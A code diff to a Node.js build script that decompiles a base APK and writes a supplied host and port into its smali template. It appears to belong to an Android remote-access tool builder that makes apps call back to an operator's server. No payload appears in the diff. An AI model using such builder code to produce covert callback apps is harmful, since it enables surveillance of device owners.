@@ -1,6 +1,7 @@
 const
     cp = require('child_process'),
     fs = require('fs'),
+    path = require('path'),
     CONST = require('./const');
 
 // Thanks -> https://stackoverflow.com/a/19734810/7594368
@@ -63,39 +64,57 @@ function patchAPK(URI, PORT, cb) {
         return cb('Invalid Port');
     }
 
-    // Verify the smali template file exists before attempting to read
+    // If the smali template is missing, decompile base.apk first
     if (!fs.existsSync(CONST.patchFilePath)) {
-        resetBuildFlag();
-        logManager.log(CONST.logTypes.error, 'File Patch Error - Template file missing: ' + CONST.patchFilePath);
-        return cb('File Patch Error - Template file missing');
+        logManager.log(CONST.logTypes.info, 'Smali template missing — decompiling base.apk...');
+        const baseApk = path.join(path.dirname(CONST.smaliPath), 'base.apk');
+        if (!fs.existsSync(baseApk)) {
+            resetBuildFlag();
+            logManager.log(CONST.logTypes.error, 'Build failed - base.apk not found: ' + baseApk);
+            return cb('Build failed - base.apk not found');
+        }
+        cp.execFile('java', ['-jar', CONST.apkTool, 'd', baseApk, '-o', CONST.smaliPath, '-f'], (deErr) => {
+            if (deErr) {
+                resetBuildFlag();
+                logManager.log(CONST.logTypes.error, 'Decompile failed: ' + deErr.message);
+                return cb('Decompile failed: ' + deErr.message);
+            }
+            logManager.log(CONST.logTypes.success, 'Decompiled base.apk successfully');
+            doPatch();
+        });
+        return;
     }
 
-    fs.readFile(CONST.patchFilePath, 'utf8', function (err, data) {
-        if (err) {
-            resetBuildFlag();
-            logManager.log(CONST.logTypes.error, 'File Patch Error - READ: ' + (err.code || err.message) + ' (' + CONST.patchFilePath + ')');
-            return cb('File Patch Error - READ');
-        }
-        
-        // Patch 3: Guard against missing markers
-        let startIdx = data.indexOf("http://");
-        let endIdx = data.indexOf("?model=");
-        if (startIdx === -1 || endIdx === -1) {
-            resetBuildFlag();
-            return cb('Corrupted APK Template - Markers Missing');
-        }
+    doPatch();
 
-        var result = data.replace(data.substring(startIdx, endIdx), "http://" + URI + ":" + portInt);
-        fs.writeFile(CONST.patchFilePath, result, 'utf8', function (err) {
+    function doPatch() {
+        fs.readFile(CONST.patchFilePath, 'utf8', function (err, data) {
             if (err) {
                 resetBuildFlag();
-                return cb('File Patch Error - WRITE')
-            } else {
-                // building will continue in buildAPK, so we keep isBuilding true
-                return cb(false)
+                logManager.log(CONST.logTypes.error, 'File Patch Error - READ: ' + (err.code || err.message) + ' (' + CONST.patchFilePath + ')');
+                return cb('File Patch Error - READ');
             }
+            
+            // Guard against missing markers
+            let startIdx = data.indexOf("http://");
+            let endIdx = data.indexOf("?model=");
+            if (startIdx === -1 || endIdx === -1) {
+                resetBuildFlag();
+                return cb('Corrupted APK Template - Markers Missing');
+            }
+
+            var result = data.replace(data.substring(startIdx, endIdx), "http://" + URI + ":" + portInt);
+            fs.writeFile(CONST.patchFilePath, result, 'utf8', function (err) {
+                if (err) {
+                    resetBuildFlag();
+                    return cb('File Patch Error - WRITE')
+                } else {
+                    // building will continue in buildAPK, so we keep isBuilding true
+                    return cb(false)
+                }
+            });
         });
-    });
+    }
 }
 
 function buildAPK(cb) {
